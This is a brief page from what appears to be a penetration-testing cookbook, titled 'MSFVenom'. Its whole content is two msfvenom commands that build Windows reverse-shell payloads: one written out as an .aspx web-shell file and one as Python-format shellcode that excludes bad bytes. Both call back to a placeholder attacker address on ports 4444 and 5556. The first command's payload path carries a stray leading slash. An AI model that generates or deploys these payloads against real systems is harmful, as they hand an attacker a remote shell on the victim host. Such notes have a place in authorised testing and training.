---
layout: default
title: MSFVenom
parent: COOKBOOKS
has_children: false
has_toc: false
---

{% include toc.html %}

## Creating payloads

```
// Win x64 - Reverse shell - .aspx - Unencoded - Tested
msfvenom -p /windows/shell_reverse_tcp LHOST=10.x.x.x LPORT=4444 -f aspx > shell.aspx

// Win x64 - Reverse Shell - Shellcode - Unencoded - Tested - Check the byte values for your application.
msfvenom -p windows/shell_reverse_tcp LHOST=10.x.x.x LPORT=5556 -b '\x00\x0A\x0D' -f python
```